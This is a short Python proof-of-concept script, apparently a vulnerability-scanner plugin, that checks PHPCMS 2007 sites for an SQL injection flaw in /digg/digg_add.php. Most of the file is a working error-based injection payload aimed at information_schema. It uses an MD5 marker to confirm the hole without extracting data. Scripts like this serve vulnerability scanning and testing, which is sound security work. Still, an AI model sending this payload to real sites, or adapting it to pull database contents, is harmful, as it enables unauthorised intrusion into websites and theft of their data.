#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  PHPCMS 2007 /digg_add.php SQL注入
Author    :  sqzr
"""
def assign(service, arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    url = arg
    payload = ("/digg/digg_add.php?id=1&con=2&digg_mod=digg_data+WHERE+1%3d2+%2band(select+1+from(select+count(*)%2cconcat((select+(select+(select+concat(0x7e%2cmd5(3.1415)%2c0x7e)))+from+information_schema.tables+limit+0%2c1)%2cfloor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)%2523")
    code, head, body, _, _ = curl.curl(url + payload)
    if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', 'http://www.example.com/')[1])